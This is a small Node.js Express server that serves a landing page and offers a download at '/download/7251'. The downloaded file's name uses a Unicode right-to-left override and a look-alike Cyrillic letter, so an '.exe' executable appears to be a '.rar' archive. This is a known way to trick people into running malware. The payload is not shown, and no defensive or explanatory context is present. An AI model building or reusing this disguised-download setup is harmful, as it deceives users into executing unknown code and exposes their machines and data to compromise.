const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();

const PORT = process.env.PORT || 8080;
const frontend = fs.readFileSync('mainpage.html', 'utf8');


app.get('/posts/84146', async (req, res) => {
  res.send(frontend);
});

app.get('/download/7251', async (req, res) => {
  const file = path.join(__dirname, 'lоrd‮rar.exe');
  res.download(file);
});

app.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
});